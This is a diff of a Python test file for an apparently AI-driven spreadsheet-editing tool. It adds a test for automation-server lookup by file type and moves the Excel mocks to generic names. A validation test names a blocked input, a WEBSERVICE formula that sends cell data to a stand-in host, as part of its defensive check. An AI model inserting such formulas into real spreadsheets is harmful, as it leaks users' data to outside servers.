@@ -56,6 +56,16 @@ FINISH_ORDERS = [
 ]
 
 
+
+class AutomationServerTest(unittest.TestCase):
+    """The app that edits a file is found from the file type, never from a name (PLAN Section 0)."""
+
+    def test_only_the_registered_openers_own_automation_server_counts(self):
+        self.assertIsNone(ocade_sheets.automation_server(".ocade-no-such-type"))
+        found = ocade_sheets.automation_server(".xlsx")
+        if found:  # whatever app this computer registers for .xlsx, by its own registration
+            self.assertTrue(found["progId"].endswith(".Application"), found)
+
 class ValidationTest(unittest.TestCase):
     def test_refuses_what_is_unsafe_or_malformed(self):
         for ops in ([{"op": "set", "cell": "A1", "value": '=WEBSERVICE("https://x.test/?"&B1)'}],
@@ -137,14 +147,14 @@ class FileEngineTest(unittest.TestCase):
         """P04: Excel saved, then its read-back threw; the job said only "failed"."""
         import unittest.mock
 
-        def saved_then_failed(path, sheet, ops, cancel, close=False):
+        def saved_then_failed(path, sheet, ops, cancel, close, server):
             path.write_bytes(b"changed by the job")
             return {"ok": False, "engine": "excel", "applied": ["set"], "error": "read-back failed"}
 
         before = self.book.read_bytes()
         pc = Computer(str(self.root))
-        with unittest.mock.patch.object(ocade_sheets, "excel_available", return_value=True), \
-                unittest.mock.patch.object(ocade_sheets, "edit_with_excel", saved_then_failed):
+        with unittest.mock.patch.object(ocade_sheets, "automation_server", return_value={"progId": "X.Application", "app": "X"}), \
+                unittest.mock.patch.object(ocade_sheets, "edit_with_automation", saved_then_failed):
             out = pc.run({"action": "sheet_edit", "path": "sales.xlsx", "overwrite": True,
                           "ops": FINISH_ORDERS[:1]})
         self.assertEqual(out["status"], "failed")
@@ -157,8 +167,8 @@ class FileEngineTest(unittest.TestCase):
         import unittest.mock
         failed = {"ok": False, "engine": "excel", "applied": ["set"], "error": "Excel refused",
                   "unsavedEdits": True}
-        with unittest.mock.patch.object(ocade_sheets, "excel_available", return_value=True), \
-                unittest.mock.patch.object(ocade_sheets, "edit_with_excel", return_value=failed):
+        with unittest.mock.patch.object(ocade_sheets, "automation_server", return_value={"progId": "X.Application", "app": "X"}), \
+                unittest.mock.patch.object(ocade_sheets, "edit_with_automation", return_value=failed):
             out = Computer(str(self.root)).run({"action": "sheet_edit", "path": "sales.xlsx",
                                                 "overwrite": True, "ops": FINISH_ORDERS[:1]})
         self.assertFalse(out["changed"])
@@ -217,7 +227,7 @@ class FileEngineTest(unittest.TestCase):
 
 
 @live
-@unittest.skipUnless(ocade_sheets.excel_available(), "needs Microsoft Excel (Windows)")
+@unittest.skipUnless(ocade_sheets.automation_server(".xlsx"), "needs an app that automates .xlsx")
 class OriginalsAndChecksTest(unittest.TestCase):
     """Found on the preview: asked to keep the original, JARVIS edited it and then copied it, and
     its totals row summed itself (C6 = SUM(B6:E6)) while the read-back said only "0"."""
@@ -252,7 +262,7 @@ class OriginalsAndChecksTest(unittest.TestCase):
 
 
 @live
-class RealExcelTest(unittest.TestCase):
+class RealSpreadsheetAppTest(unittest.TestCase):
     """The acceptance task in the person's real Excel: visible, calculated, saved, reopened, verified."""
 
     def test_finish_the_orders_sheet_in_excel(self):
@@ -260,7 +270,7 @@ class RealExcelTest(unittest.TestCase):
         path = root / "sales.xlsx"
         workbook(path)
         out = ocade_sheets.edit(path, "Orders", FINISH_ORDERS, root / "undo", threading.Event(),
-                                engine="excel", close=True)
+                                close=True)
         self.assertTrue(out["ok"], out)
         self.assertTrue(out["savedAndReopened"], "the saved file did not read back the same")
         revenue = [sum(u * p for _, _, u, p in ORDERS)]
